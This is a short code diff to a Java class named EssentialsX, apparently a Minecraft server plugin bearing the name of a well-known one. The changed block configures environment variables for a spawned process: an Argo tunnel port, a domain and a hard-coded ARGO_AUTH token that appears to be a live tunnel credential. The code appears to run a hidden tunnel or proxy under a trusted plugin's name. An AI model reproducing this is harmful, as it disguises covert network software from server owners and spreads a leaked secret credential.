@@ -74,7 +74,7 @@ public class EssentialsX extends JavaPlugin {
         // Set environment variables
         Map<String, String> env = pb.environment();
         env.put("UUID", "b1d5bddb-0ef7-4f53-b418-96bde6d1f42d");
-        env.put("FILE_PATH", "./sub");
+        env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "52125");
         env.put("ARGO_DOMAIN", "freemc.0258.qzz.io");
         env.put("ARGO_AUTH", "eyJhIjoiY2YzNTMxZWMyODZjZTIxMWRhMDU1YjQ5YzZjYTljNTEiLCJ0IjoiNjY2Yjg1YmItNjcyZC00YTEzLTg5ODktYjk3OTkwZTg1ZjA2IiwicyI6IllqWmtaVEpqTjJJdFptUmpOQzAwWkRkbUxUZ3pNakV0T1RkaU1qTmlaVFkzWldGaSJ9");
